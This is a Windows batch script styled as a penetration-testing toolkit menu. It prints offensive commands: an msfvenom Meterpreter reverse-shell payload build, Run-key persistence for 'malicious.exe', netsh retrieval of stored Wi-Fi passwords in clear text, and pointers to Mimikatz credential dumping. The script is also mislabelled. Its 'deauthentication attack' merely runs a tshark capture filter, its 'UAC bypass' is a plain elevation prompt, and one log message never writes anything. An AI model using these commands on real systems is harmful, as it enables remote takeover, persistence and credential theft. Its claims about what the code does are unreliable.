@echo off
mode 80, 30
title Advanced Penetration Testing Toolkit
chcp 65001 >nul

:start
cls
echo.
echo.
echo [34m┌───────────────────────────────────────────────────────────────────┐[0m
echo [34m│ [96m██████╗ ███████╗███╗   ██╗████████╗███████╗██████╗ ███████╗ [34m│[0m
echo [34m│ [96m██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗██╔════╝ [34m│[0m
echo [34m│ [96m██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ██████╔╝█████╗    [34m│[0m
echo [34m│ [96m██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔═══╝ ██╔══╝    [34m│[0m
echo [34m│ [96m██║     ███████╗██║ ╚████║   ██║   ███████╗██║     ███████╗ [34m│[0m
echo [34m│ [96m╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝     ╚══════╝ [34m│[0m
echo [34m└───────────────────────────────────────────────────────────────────┘[0m
echo.
echo [96m       Select an Option Below to Explore Tools and Techniques[0m
echo.
ping localhost -n 1 >nul
echo     [90;1m#═╦═══════»[0m  [92m[Network Scanning][0m        [95m[1][0m
ping localhost -n 1 >nul
echo       [90;1m╚═╦══════»[0m  [92m[Password Attacks][0m       [95m[2][0m
ping localhost -n 1 >nul
echo         [90;1m╚═╦═════»[0m  [92m[Privilege Escalation][0m   [95m[3][0m
ping localhost -n 1 >nul
echo           [90;1m╚═╦════»[0m  [92m[Exploitation][0m          [95m[4][0m
ping localhost -n 1 >nul
echo             [90;1m╚═╦═══»[0m  [92m[Post-Exploitation][0m     [95m[5][0m
ping localhost -n 1 >nul
echo               [90;1m╚═╦═»[0m  [92m[Wi-Fi Tools][0m          [95m[6][0m
ping localhost -n 1 >nul
echo                 [90;1m╚═╦»[0m  [92m[Logging & Reporting][0m  [95m[7][0m
ping localhost -n 1 >nul
echo                   [90;1m╚═╦»[0m  [92m[Wi-Fi Attack Script][0m [95m[8][0m
ping localhost -n 1 >nul
echo                     [90;1m╚═»[0m  [92m[Exit][0m              [95m[9][0m
echo|set /p=".                      [90;1m╚══>[0m"
choice /c 123456789 /n >nul
set choice=%errorlevel%

if %choice%==1 goto network_scanning
if %choice%==2 goto password_attacks
if %choice%==3 goto privilege_escalation
if %choice%==4 goto exploitation
if %choice%==5 goto post_exploitation
if %choice%==6 goto wifi_tools
if %choice%==7 goto logging
if %choice%==8 goto wifi_attack
if %choice%==9 exit

:wifi_attack
cls
echo ============================================================
echo                 Wi-Fi Attack Script (Educational)
echo ============================================================
echo [96mThis script demonstrates a Wi-Fi deauthentication attack.[0m
echo [92mRequirements:[0m
echo  - Install Wireshark and TShark
echo  - Wireless adapter supporting monitor mode
echo  - Run the script as Administrator
echo.
echo [93m[+] Options:[0m
echo  [1] Broadcast Attack - Disconnect all devices
echo  [2] Targeted Attack  - Disconnect a specific device
echo.
set /p "attack_type=Select an option (1 or 2): "

if "%attack_type%"=="1" (
    echo Starting broadcast deauthentication attack...
    powershell -Command ^
    "if (!(Test-Path tshark.exe)) { Write-Host 'TShark not found. Please install Wireshark.'; exit } ^
    Start-Process -NoNewWindow -Wait -FilePath 'tshark.exe' -ArgumentList '-i 1 -Y wlan.fc.type_subtype==12'"
    echo Attack complete. >> wifi_attack_log.txt
    echo Deauthentication attack logged to wifi_attack_log.txt.
) else if "%attack_type%"=="2" (
    set /p "target_mac=Enter target MAC address: "
    echo Starting targeted deauthentication attack on %target_mac%...
    powershell -Command ^
    "if (!(Test-Path tshark.exe)) { Write-Host 'TShark not found. Please install Wireshark.'; exit } ^
    Start-Process -NoNewWindow -Wait -FilePath 'tshark.exe' -ArgumentList '-i 1 -Y wlan.addr == %target_mac%'"
    echo Targeted attack on %target_mac% logged to wifi_attack_log.txt.
    echo Deauthentication attack logged to wifi_attack_log.txt.
)
pause
goto start

:network_scanning
cls
echo ============================================================
echo                  Network Scanning & Recon
echo ============================================================
echo [92m[+] View Network Configurations[0m:
echo    ipconfig /all
echo.
pause
goto start

:password_attacks
cls
echo ============================================================
echo                     Password Attacks
echo ============================================================
echo [92m[+] Credential Dumping[0m:
echo    Use Mimikatz or similar tools for dumping credentials.
pause
goto start

:privilege_escalation
cls
echo ============================================================
echo                Privilege Escalation Techniques
echo ============================================================
echo [92m[+] Simulate UAC Bypass[0m:
echo    powershell -Command "Start-Process cmd -Verb runAs"
pause
goto start

:exploitation
cls
echo ============================================================
echo                     Exploitation
echo ============================================================
echo [92m[+] Generate Payloads[0m:
echo    msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe > payload.exe
pause
goto start

:post_exploitation
cls
echo ============================================================
echo                 Post-Exploitation Tools
echo ============================================================
echo [92m[+] Persist via Registry[0m:
echo    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Persistence /t REG_SZ /d "cmd.exe /c malicious.exe"
pause
goto start

:wifi_tools
cls
echo ============================================================
echo                     Wi-Fi Tools
echo ============================================================
echo [92m[+] Retrieve Stored Wi-Fi Passwords[0m:
echo    netsh wlan show profiles
echo    netsh wlan show profile name="WiFiName" key=clear
pause
goto start

:logging
cls
echo ============================================================
echo                 Logging & Reporting Tools
echo ============================================================
echo [92m[+] Log Network Activity[0m:
echo    netstat -an > network_log.txt
pause
goto start
